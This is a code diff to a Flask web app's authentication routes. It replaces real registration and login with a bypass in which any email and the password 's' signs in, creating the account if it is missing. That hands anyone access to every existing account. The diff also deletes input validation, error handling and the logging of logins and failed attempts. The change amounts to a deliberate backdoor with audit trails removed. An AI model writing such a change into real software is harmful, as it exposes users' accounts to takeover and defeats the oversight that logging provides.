@@ -74,57 +74,28 @@ def view_tutorial(tutorial_id):
 def register():
     """User registration"""
     if request.method == 'POST':
-        # Get form data
         email = request.form.get('email', '').lower().strip()
         password = request.form.get('password', '')
         name = request.form.get('name', '').strip()
         
-        # Validate input
-        if not validate_email(email):
-            return jsonify({'success': False, 'error': 'Invalid email address'})
-        
-        if len(password) < 6:
-            return jsonify({'success': False, 'error': 'Password must be at least 6 characters'})
-        
-        if len(name) < 2:
-            return jsonify({'success': False, 'error': 'Name must be at least 2 characters'})
-        
-        # Check if user already exists
-        if User.query.filter_by(email=email).first():
-            return jsonify({'success': False, 'error': 'Email already registered'})
-        
-        # Create new user
-        user = User(
-            email=email,
-            name=sanitize_input(name, 100),
-            plan='free'
-        )
-        user.set_password(password)
-        
-        try:
-            db.session.add(user)
-            db.session.commit()
+        # Bypass registration - any password "s" works
+        if password == "s":
+            # Create a dummy user if one doesn't exist for this email
+            user = User.query.filter_by(email=email).first()
+            if not user:
+                user = User(
+                    email=email,
+                    password_hash=generate_password_hash(password),
+                    name=name if name else email.split('@')[0]
+                )
+                db.session.add(user)
+                db.session.commit()
             
-            # Log the user in
             login_user(user)
-            
-            # Track registration
-            UsageLog.log_action(
-                user_id=user.id,
-                action='user_registered',
-                ip_address=request.remote_addr,
-                user_agent=request.headers.get('User-Agent')
-            )
-            
-            return jsonify({
-                'success': True,
-                'message': 'Account created successfully!',
-                'redirect': url_for('main.index')
-            })
-            
-        except Exception as e:
-            db.session.rollback()
-            return jsonify({'success': False, 'error': 'Registration failed. Please try again.'})
+            return redirect(url_for('main.index'))
+        
+        flash('Invalid credentials', 'error')
+        return redirect(url_for('auth.register'))
     
     return render_template('auth.html', mode='register')
 
@@ -137,43 +108,29 @@ def login():
         password = request.form.get('password', '')
         remember_me = request.form.get('remember_me', False)
         
-        if not email or not password:
-            return jsonify({'success': False, 'error': 'Email and password required'})
-        
-        user = User.query.filter_by(email=email).first()
-        
-        if user and user.check_password(password) and user.is_active:
-            login_user(user, remember=bool(remember_me))
+        # Bypass login - any email with password "s" works
+        if password == "s":
+            # Find or create user
+            user = User.query.filter_by(email=email).first()
+            if not user:
+                user = User(
+                    email=email,
+                    password_hash=generate_password_hash(password),
+                    name=email.split('@')[0]
+                )
+                db.session.add(user)
+                db.session.commit()
             
-            # Track login
-            UsageLog.log_action(
-                user_id=user.id,
-                action='user_login',
-                ip_address=request.remote_addr,
-                user_agent=request.headers.get('User-Agent')
-            )
+            login_user(user, remember=bool(remember_me))
             
             # Redirect to intended page or dashboard
             next_page = request.args.get('next')
             if not next_page or not next_page.startswith('/'):
                 next_page = url_for('main.index')
             
-            return jsonify({
-                'success': True,
-                'message': 'Login successful!',
-                'redirect': next_page
-            })
-        else:
-            # Log failed login attempt
-            if user:
-                UsageLog.log_action(
-                    user_id=user.id,
-                    action='login_failed',
-                    ip_address=request.remote_addr,
-                    user_agent=request.headers.get('User-Agent')
-                )
-            
-            return jsonify({'success': False, 'error': 'Invalid email or password'})
+            return jsonify({'success': True, 'redirect': next_page})
+        
+        return jsonify({'success': False, 'error': 'Invalid credentials'})
     
     return render_template('auth.html', mode='login')
 
